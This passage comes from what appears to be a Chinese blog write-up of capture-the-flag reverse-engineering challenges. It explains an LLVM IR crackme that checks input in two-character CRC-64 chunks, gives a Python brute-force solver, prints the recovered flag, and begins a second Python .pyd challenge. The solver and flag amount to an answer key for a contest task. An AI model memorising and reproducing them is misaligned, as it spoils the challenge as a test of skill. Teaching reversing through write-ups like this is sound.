<span class="selector-tag">label</span> %<span class="selector-tag">return</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">return</span>:                                           ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.end</span>, %<span class="selector-tag">if</span><span class="selector-class">.then</span></span><br><span class="line">  %<span class="number">7</span> = <span class="selector-tag">load</span> <span class="selector-tag">i32</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">retval</span>, <span class="selector-tag">align</span> <span class="number">4</span></span><br><span class="line">  <span class="selector-tag">ret</span> <span class="selector-tag">i32</span> %<span class="number">7</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> <span class="selector-tag">memory</span>(<span class="attribute">argmem</span>: readwrite)</span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">void</span> @<span class="selector-tag">llvm</span><span class="selector-class">.memcpy</span><span class="selector-class">.p0</span><span class="selector-class">.p0</span><span class="selector-class">.i64</span>(ptr noalias nocapture writeonly, ptr noalias nocapture readonly, i64, i1 immarg) <span class="selector-id">#2</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> <span class="selector-tag">memory</span>(<span class="attribute">argmem</span>: write)</span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">void</span> @<span class="selector-tag">llvm</span><span class="selector-class">.memset</span><span class="selector-class">.p0</span><span class="selector-class">.i64</span>(ptr nocapture writeonly, i8, i64, i1 immarg) <span class="selector-id">#3</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">printf</span>(ptr noundef %_Format, ...) <span class="selector-id">#4</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %_Format.addr = alloca ptr, align 8</span><br><span class="line">  %_Result = alloca i32, align 4</span><br><span class="line">  %_ArgList = alloca ptr, align 8</span><br><span class="line">  store ptr %_Format, ptr %_Format.addr, align 8</span><br><span class="line">  call void @llvm.va_start(ptr %_ArgList)</span><br><span class="line">  %0 = load ptr, ptr %_ArgList, align 8</span><br><span class="line">  %1 = load ptr, ptr %_Format.addr, align 8</span><br><span class="line">  %call = call ptr @__acrt_iob_func(i32 noundef 1)</span><br><span class="line">  %call1 = call i32 @_vfprintf_l(ptr noundef %call, ptr noundef %1, ptr noundef null, ptr noundef %0)</span><br><span class="line">  store i32 %call1, ptr %_Result, align 4</span><br><span class="line">  call void @llvm.va_end(ptr %_ArgList)</span><br><span class="line">  %2 = load i32, ptr %_Result, align 4</span><br><span class="line">  ret i32 %2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">scanf</span>(ptr noundef %_Format, ...) <span class="selector-id">#4</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %_Format.addr = alloca ptr, align 8</span><br><span class="line">  %_Result = alloca i32, align 4</span><br><span class="line">  %_ArgList = alloca ptr, align 8</span><br><span class="line">  store ptr %_Format, ptr %_Format.addr, align 8</span><br><span class="line">  call void @llvm.va_start(ptr %_ArgList)</span><br><span class="line">  %0 = load ptr, ptr %_ArgList, align 8</span><br><span class="line">  %1 = load ptr, ptr %_Format.addr, align 8</span><br><span class="line">  %call = call ptr @__acrt_iob_func(i32 noundef 0)</span><br><span class="line">  %call1 = call i32 @_vfscanf_l(ptr noundef %call, ptr noundef %1, ptr noundef null, ptr noundef %0)</span><br><span class="line">  store i32 %call1, ptr %_Result, align 4</span><br><span class="line">  call void @llvm.va_end(ptr %_ArgList)</span><br><span class="line">  %2 = load i32, ptr %_Result, align 4</span><br><span class="line">  ret i32 %2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i64</span> @<span class="selector-tag">strlen</span>(ptr noundef) <span class="selector-id">#5</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nosync</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">void</span> @<span class="selector-tag">llvm</span><span class="selector-class">.va_start</span>(ptr) <span class="selector-id">#6</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">_vfprintf_l</span>(ptr noundef %_Stream, ptr noundef %_Format, ptr noundef %_Locale, ptr noundef %_ArgList) <span class="selector-id">#4</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %_ArgList.addr = alloca ptr, align 8</span><br><span class="line">  %_Locale.addr = alloca ptr, align 8</span><br><span class="line">  %_Format.addr = alloca ptr, align 8</span><br><span class="line">  %_Stream.addr = alloca ptr, align 8</span><br><span class="line">  store ptr %_ArgList, ptr %_ArgList.addr, align 8</span><br><span class="line">  store ptr %_Locale, ptr %_Locale.addr, align 8</span><br><span class="line">  store ptr %_Format, ptr %_Format.addr, align 8</span><br><span class="line">  store ptr %_Stream, ptr %_Stream.addr, align 8</span><br><span class="line">  %0 = load ptr, ptr %_ArgList.addr, align 8</span><br><span class="line">  %1 = load ptr, ptr %_Locale.addr, align 8</span><br><span class="line">  %2 = load ptr, ptr %_Format.addr, align 8</span><br><span class="line">  %3 = load ptr, ptr %_Stream.addr, align 8</span><br><span class="line">  %call = call ptr @__local_stdio_printf_options()</span><br><span class="line">  %4 = load i64, ptr %call, align 8</span><br><span class="line">  %call1 = call i32 @__stdio_common_vfprintf(i64 noundef %4, ptr noundef %3, ptr noundef %2, ptr noundef %1, ptr noundef %0)</span><br><span class="line">  ret i32 %call1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">ptr</span> @<span class="selector-tag">__acrt_iob_func</span>(i32 noundef) <span class="selector-id">#5</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nosync</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">void</span> @<span class="selector-tag">llvm</span><span class="selector-class">.va_end</span>(ptr) <span class="selector-id">#6</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">__stdio_common_vfprintf</span>(i64 noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef) <span class="selector-id">#5</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">ptr</span> @<span class="selector-tag">__local_stdio_printf_options</span>() <span class="selector-id">#0</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  ret ptr @&quot;?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">_vfscanf_l</span>(ptr noundef %_Stream, ptr noundef %_Format, ptr noundef %_Locale, ptr noundef %_ArgList) <span class="selector-id">#4</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %_ArgList.addr = alloca ptr, align 8</span><br><span class="line">  %_Locale.addr = alloca ptr, align 8</span><br><span class="line">  %_Format.addr = alloca ptr, align 8</span><br><span class="line">  %_Stream.addr = alloca ptr, align 8</span><br><span class="line">  store ptr %_ArgList, ptr %_ArgList.addr, align 8</span><br><span class="line">  store ptr %_Locale, ptr %_Locale.addr, align 8</span><br><span class="line">  store ptr %_Format, ptr %_Format.addr, align 8</span><br><span class="line">  store ptr %_Stream, ptr %_Stream.addr, align 8</span><br><span class="line">  %0 = load ptr, ptr %_ArgList.addr, align 8</span><br><span class="line">  %1 = load ptr, ptr %_Locale.addr, align 8</span><br><span class="line">  %2 = load ptr, ptr %_Format.addr, align 8</span><br><span class="line">  %3 = load ptr, ptr %_Stream.addr, align 8</span><br><span class="line">  %call = call ptr @__local_stdio_scanf_options()</span><br><span class="line">  %4 = load i64, ptr %call, align 8</span><br><span class="line">  %call1 = call i32 @__stdio_common_vfscanf(i64 noundef %4, ptr noundef %3, ptr noundef %2, ptr noundef %1, ptr noundef %0)</span><br><span class="line">  ret i32 %call1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">__stdio_common_vfscanf</span>(i64 noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef) <span class="selector-id">#5</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">ptr</span> @<span class="selector-tag">__local_stdio_scanf_options</span>() <span class="selector-id">#0</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  ret ptr @&quot;?_OptionsStorage@?1??__local_stdio_scanf_options@@9@4_KA&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#0</span> = &#123; <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span> &quot;<span class="selector-tag">min-legal-vector-width</span>&quot;=&quot;<span class="number">0</span>&quot; &quot;<span class="selector-tag">no-trapping-math</span>&quot;=&quot;<span class="selector-tag">true</span>&quot; &quot;<span class="selector-tag">stack-protector-buffer-size</span>&quot;=&quot;<span class="number">8</span>&quot; &quot;<span class="selector-tag">target-cpu</span>&quot;=&quot;<span class="selector-tag">x86-64</span>&quot; &quot;<span class="selector-tag">target-features</span>&quot;=&quot;+<span class="selector-tag">cmov</span>,+<span class="selector-tag">cx8</span>,+<span class="selector-tag">fxsr</span>,+<span class="selector-tag">mmx</span>,+<span class="selector-tag">sse</span>,+<span class="selector-tag">sse2</span>,+<span class="selector-tag">x87</span>&quot; &quot;<span class="selector-tag">tune-cpu</span>&quot;=&quot;<span class="selector-tag">generic</span>&quot; &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#1</span> = &#123; <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">norecurse</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span> &quot;<span class="selector-tag">min-legal-vector-width</span>&quot;=&quot;<span class="number">0</span>&quot; &quot;<span class="selector-tag">no-trapping-math</span>&quot;=&quot;<span class="selector-tag">true</span>&quot; &quot;<span class="selector-tag">stack-protector-buffer-size</span>&quot;=&quot;<span class="number">8</span>&quot; &quot;<span class="selector-tag">target-cpu</span>&quot;=&quot;<span class="selector-tag">x86-64</span>&quot; &quot;<span class="selector-tag">target-features</span>&quot;=&quot;+<span class="selector-tag">cmov</span>,+<span class="selector-tag">cx8</span>,+<span class="selector-tag">fxsr</span>,+<span class="selector-tag">mmx</span>,+<span class="selector-tag">sse</span>,+<span class="selector-tag">sse2</span>,+<span class="selector-tag">x87</span>&quot; &quot;<span class="selector-tag">tune-cpu</span>&quot;=&quot;<span class="selector-tag">generic</span>&quot; &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#2</span> = &#123; <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> <span class="selector-tag">memory</span>(<span class="attribute">argmem</span>: readwrite) &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#3</span> = &#123; <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> <span class="selector-tag">memory</span>(<span class="attribute">argmem</span>: write) &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#4</span> = &#123; <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span> &quot;<span class="selector-tag">min-legal-vector-width</span>&quot;=&quot;<span class="number">0</span>&quot; &quot;<span class="selector-tag">no-trapping-math</span>&quot;=&quot;<span class="selector-tag">true</span>&quot; &quot;<span class="selector-tag">stack-protector-buffer-size</span>&quot;=&quot;<span class="number">8</span>&quot; &quot;<span class="selector-tag">target-cpu</span>&quot;=&quot;<span class="selector-tag">x86-64</span>&quot; &quot;<span class="selector-tag">target-features</span>&quot;=&quot;+<span class="selector-tag">cmov</span>,+<span class="selector-tag">cx8</span>,+<span class="selector-tag">fxsr</span>,+<span class="selector-tag">mmx</span>,+<span class="selector-tag">sse</span>,+<span class="selector-tag">sse2</span>,+<span class="selector-tag">x87</span>&quot; &quot;<span class="selector-tag">tune-cpu</span>&quot;=&quot;<span class="selector-tag">generic</span>&quot; &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#5</span> = &#123; &quot;<span class="selector-tag">no-trapping-math</span>&quot;=&quot;<span class="selector-tag">true</span>&quot; &quot;<span class="selector-tag">stack-protector-buffer-size</span>&quot;=&quot;<span class="number">8</span>&quot; &quot;<span class="selector-tag">target-cpu</span>&quot;=&quot;<span class="selector-tag">x86-64</span>&quot; &quot;<span class="selector-tag">target-features</span>&quot;=&quot;+<span class="selector-tag">cmov</span>,+<span class="selector-tag">cx8</span>,+<span class="selector-tag">fxsr</span>,+<span class="selector-tag">mmx</span>,+<span class="selector-tag">sse</span>,+<span class="selector-tag">sse2</span>,+<span class="selector-tag">x87</span>&quot; &quot;<span class="selector-tag">tune-cpu</span>&quot;=&quot;<span class="selector-tag">generic</span>&quot; &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#6</span> = &#123; <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nosync</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> &#125;</span><br><span class="line"></span><br><span class="line">!<span class="selector-tag">llvm</span><span class="selector-class">.linker</span><span class="selector-class">.options</span> = !&#123;!<span class="number">0</span>, !<span class="number">1</span>, !<span class="number">2</span>, !<span class="number">3</span>, !<span class="number">4</span>, !<span class="number">5</span>, !<span class="number">6</span>&#125;</span><br><span class="line">!<span class="selector-tag">llvm</span><span class="selector-class">.module</span><span class="selector-class">.flags</span> = !&#123;!<span class="number">7</span>, !<span class="number">8</span>, !<span class="number">9</span>, !<span class="number">10</span>&#125;</span><br><span class="line">!<span class="selector-tag">llvm</span><span class="selector-class">.ident</span> = !&#123;!<span class="number">11</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;!&quot;/FAILIFMISMATCH:\22_CRT_STDIO_ISO_WIDE_SPECIFIERS=0\22&quot;&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!&quot;/FAILIFMISMATCH:\22_MSC_VER=1900\22&quot;&#125;</span><br><span class="line">!<span class="number">2</span> = !&#123;!&quot;/FAILIFMISMATCH:\22_ITERATOR_DEBUG_LEVEL=0\22&quot;&#125;</span><br><span class="line">!<span class="number">3</span> = !&#123;!&quot;/FAILIFMISMATCH:\22RuntimeLibrary=MT_StaticRelease\22&quot;&#125;</span><br><span class="line">!<span class="number">4</span> = !&#123;!&quot;/DEFAULTLIB:libcpmt.lib&quot;&#125;</span><br><span class="line">!<span class="number">5</span> = !&#123;!&quot;/FAILIFMISMATCH:\22annotate_string=0\22&quot;&#125;</span><br><span class="line">!<span class="number">6</span> = !&#123;!&quot;/FAILIFMISMATCH:\22annotate_vector=0\22&quot;&#125;</span><br><span class="line">!<span class="number">7</span> = !&#123;<span class="selector-tag">i32</span> <span class="number">1</span>, !&quot;<span class="selector-tag">wchar_size</span>&quot;, <span class="selector-tag">i32</span> <span class="number">2</span>&#125;</span><br><span class="line">!<span class="number">8</span> = !&#123;<span class="selector-tag">i32</span> <span class="number">8</span>, !&quot;<span class="selector-tag">PIC</span> <span class="selector-tag">Level</span>&quot;, <span class="selector-tag">i32</span> <span class="number">2</span>&#125;</span><br><span class="line">!<span class="number">9</span> = !&#123;<span class="selector-tag">i32</span> <span class="number">7</span>, !&quot;<span class="selector-tag">uwtable</span>&quot;, <span class="selector-tag">i32</span> <span class="number">2</span>&#125;</span><br><span class="line">!<span class="number">10</span> = !&#123;<span class="selector-tag">i32</span> <span class="number">1</span>, !&quot;<span class="selector-tag">MaxTLSAlign</span>&quot;, <span class="selector-tag">i32</span> <span class="number">65536</span>&#125;</span><br><span class="line">!<span class="number">11</span> = !&#123;!&quot;<span class="selector-tag">clang</span> <span class="selector-tag">version</span> <span class="number">17.0</span><span class="selector-class">.1</span>&quot;&#125;</span><br><span class="line">!<span class="number">12</span> = <span class="selector-tag">distinct</span> !&#123;!<span class="number">12</span>, !<span class="number">13</span>&#125;</span><br><span class="line">!<span class="number">13</span> = !&#123;!&quot;<span class="selector-tag">llvm</span><span class="selector-class">.loop</span><span class="selector-class">.mustprogress</span>&quot;&#125;</span><br><span class="line">!<span class="number">14</span> = <span class="selector-tag">distinct</span> !&#123;!<span class="number">14</span>, !<span class="number">13</span>&#125;</span><br><span class="line">!<span class="number">15</span> = <span class="selector-tag">distinct</span> !&#123;!<span class="number">15</span>, !<span class="number">13</span>&#125;</span><br></pre></td></tr></table></figure></div>
<p>程序让用户输入一个字符串，然后<strong>每两个字符一组</strong>，使用
<code>calculate_crc64_direct</code> 函数进行 <strong>CRC64
校验</strong>，并与内置的 <code>@__const.main.enc</code> 中的 12 个
<code>i64</code> 常量值进行比较。如果全部匹配成功，则输出
<code>Success</code>，否则输出
<code>Error!</code>。然后我们就可以结合ai解读逆出解密脚本。</p>
<p>一、核心函数分析：<code>?calculate_crc64_direct@@YA_KPEBE_K@Z</code></p>
<p>这是一个计算 <strong>CRC64 校验值</strong> 的函数，签名为：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">calculate_crc64_direct</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">uint64_t</span> length)</span></span>;</span><br></pre></td></tr></table></figure></div>
<p>算法流程简述：</p>
<ol type="1">
<li><p>初始化 <code>crc = -1</code>（即
<code>0xFFFFFFFFFFFFFFFF</code>）。</p></li>
<li><p>对每个字节：</p>
<p>将其左移 56 位并与 <code>crc</code> 异或。</p>
<p>然后进行 8 次循环（一个字节），每次：</p>
<ul>
<li><p>如果最高位为 1，则：</p>
<div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">crc</span> = (crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0</span>x42F0E1EBA9EA3693</span><br></pre></td></tr></table></figure></div></li>
<li><p>否则：</p>
<div class="highlight-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">crc</span> &lt;&lt;= <span class="number">1</span></span><br></pre></td></tr></table></figure></div></li>
</ul></li>
<li><p>最后再与 <code>0xFFFFFFFFFFFFFFFF</code>
异或（即按位取反）返回。</p></li>
</ol>
<p>这个是标准的 <strong>CRC-64-ECMA</strong> 算法。</p>
<p>二、主程序分析：<code>main</code></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">Input U flag:</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, data)</span><br></pre></td></tr></table></figure></div>
<p>程序从控制台读取一串字符串（最多 65 个字符，保存在 <code>data</code>
数组里）。c</p>
<p>主体校验逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(data) / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">    crc = calculate_crc64_direct(data + i, <span class="number">2</span>); <span class="comment">// 每次两个字符</span></span><br><span class="line">    <span class="keyword">if</span> (crc != enc[j]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    j++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>程序以<strong>2字节为一组</strong>（即两个字符）对输入串进行 CRC64
校验，并和 <code>enc[j]</code> 中的值对比。</p>
</blockquote>
<p>所以一共有 <code>12</code> 个 CRC64 值，意味着：</p>
<ul>
<li>一共会计算 <code>12</code> 次 CRC。</li>
<li>每次使用输入中的 2 字节作为输入。</li>
</ul>
<p>所以：<strong>输入长度应该正好是 24 字节（即 24
个字符）</strong>。</p>
<p>三、目标值 <code>enc</code></p>
<p>这是 CRC 校验目标值（正确 flag 的 CRC 分组）：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">enc[<span class="number">12</span>] = &#123;</span><br><span class="line">  <span class="number">-2565957437423125689</span>, <span class="number">224890624719110086</span>, <span class="number">1357324823849588894</span>,</span><br><span class="line">  <span class="number">-8941695979231947288</span>, <span class="number">-253413330424273460</span>, <span class="number">-7817463785137710741</span>,</span><br><span class="line">  <span class="number">-5620500441869335673</span>, <span class="number">984060876288820705</span>, <span class="number">-6993555743080142153</span>,</span><br><span class="line">  <span class="number">-7892488171899690683</span>, <span class="number">7190415315123037707</span>, <span class="number">-7218240302740981077</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>四、输入长度与数据块</p>
<p>每次取两个字符，使用 <code>calculate_crc64_direct</code> 校验：</p>
<p>也就是说：</p>
<ul>
<li>输入是一个 24 字节的字符串。</li>
<li>每次从 <code>i</code> 开始连续取两个字节，计算出 CRC。</li>
</ul>
<p>所以我们应当：</p>
<ul>
<li><strong>构造一个长度为 24
的字符串</strong>，使得它的每个连续两个字符的 CRC64
校验值对应上表中的目标。</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">POLY = <span class="number">0x42F0E1EBA9EA3693</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc64_ecma</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    crc = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        crc ^= b &lt;&lt; <span class="number">56</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> crc &amp; (<span class="number">1</span> &lt;&lt; <span class="number">63</span>):</span><br><span class="line">                crc = (crc &lt;&lt; <span class="number">1</span>) ^ POLY</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                crc &lt;&lt;= <span class="number">1</span></span><br><span class="line">            crc &amp;= <span class="number">0xFFFFFFFFFFFFFFFF</span>  <span class="comment"># 强制截断为64位</span></span><br><span class="line">    <span class="keyword">return</span> crc ^ <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">enc_values = [</span><br><span class="line">    -<span class="number">2565957437423125689</span>,</span><br><span class="line">    <span class="number">224890624719110086</span>,</span><br><span class="line">    <span class="number">1357324823849588894</span>,</span><br><span class="line">    -<span class="number">8941695979231947288</span>,</span><br><span class="line">    -<span class="number">253413330424273460</span>,</span><br><span class="line">    -<span class="number">7817463785137710741</span>,</span><br><span class="line">    -<span class="number">5620500441869335673</span>,</span><br><span class="line">    <span class="number">984060876288820705</span>,</span><br><span class="line">    -<span class="number">6993555743080142153</span>,</span><br><span class="line">    -<span class="number">7892488171899690683</span>,</span><br><span class="line">    <span class="number">7190415315123037707</span>,</span><br><span class="line">    -<span class="number">7218240302740981077</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转成无符号表示</span></span><br><span class="line">enc_values = [v &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span> <span class="keyword">for</span> v <span class="keyword">in</span> enc_values]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> target <span class="keyword">in</span> enc_values:</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            chunk = <span class="built_in">bytes</span>([a, b])</span><br><span class="line">            <span class="keyword">if</span> crc64_ecma(chunk) == target:</span><br><span class="line">                flag += chunk</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Failed to find match for <span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Recovered flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406224605129.png"
                      class=""
                >
<p>flag{LLVM_1s_Fun_Ri9h7?}</p>
<h4 id="re-moon">re-Moon</h4>
<p>有个.py和.pyd文件，py文件里面使用了pyd</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> moon </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I tried my best, to live an ordinary life.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;But I hope you can look up and see the moonlight through reverse engineering on the streets full of sixpence.&quot;</span>)</span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span>(<span class="string">&quot;Enter your flag: &quot;</span>).strip()</span><br><span class="line"></span><br><span class="line">result, error = moon.check_flag(user_input)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> error:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error.&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;I think you have found the right way.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You seem to be lost.&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>就要知道pyd在python那个版本下的，在自己的3.12不对，运气好直接在虚拟机的3.11直接成功</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-222151-1744002931594-1.png"
                      class=""
